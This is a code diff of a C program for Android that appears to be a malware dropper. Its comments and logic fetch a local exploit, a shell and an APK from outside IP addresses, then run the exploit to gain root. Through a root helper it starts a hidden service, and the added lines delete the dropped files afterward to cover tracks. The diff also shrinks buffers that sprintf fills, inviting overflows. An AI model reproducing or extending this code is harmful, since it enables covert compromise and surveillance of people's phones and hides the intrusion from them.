@@ -1,5 +1,5 @@
 /*
-    adb push ../libs/armeabi/download /data/local/tmp/d
+    $NDK/ndk-build && adb push ../libs/armeabi/download /data/local/tmp/d
     /data/local/tmp/d d 192.168.1.8 80 /data/local/tmp/memo.txt
     /data/local/tmp/d w 93.62.139.41 /data/local/tmp/galileo.png /images/stories/galileo.png
     /data/local/tmp/d w 74.207.224.54 /data/local/tmp/inst.apk /inst/inst.v2.apk
@@ -55,7 +55,6 @@ int download(char* ip, int server_port, char* localfile, char* send_data, char* 
     }
 
     FILE* file = fopen(localfile, "w+");
-
     if (file == NULL)
     {
         printf("cannot open file: %s\n", localfile);
@@ -81,7 +80,7 @@ int download(char* ip, int server_port, char* localfile, char* send_data, char* 
         ptr = buf;
 
         if (nread < 0) {
-                perror("read");
+                perror("cannot read\n");
                 return(1);
         }
 
@@ -146,8 +145,8 @@ int main(int argc, char* argv[])
         // gets the local exploit and the shell.
         // runs the local in order to install the shell
         // if it works, it downloads and install the apk
-        char buf_command[1024];
-        char buf_localfile[1024];
+        char buf_command[160];
+        char buf_localfile[128];
         char* ip = argv[2];
         char* localdir = argv[3];
 
@@ -192,6 +191,13 @@ int main(int argc, char* argv[])
         system(buf_command);
         sprintf(buf_command, "/system/bin/rilcap qzx \"export LD_LIBRARY_PATH=/vendor/lib:/system/lib\nam startservice com.android.deviceinfo/.ServiceMain\"");
         system(buf_command);
+
+        sprintf(buf_localfile, "%s/local", localdir);
+        unlink(buf_localfile);
+        sprintf(buf_localfile, "%s/shell", localdir);
+        unlink(buf_localfile);
+        sprintf(buf_localfile, "%s/inst.apk", localdir);
+        unlink(buf_localfile);
 
     }else{
         printf("Error: command unknown: %s\n", argv[1]);
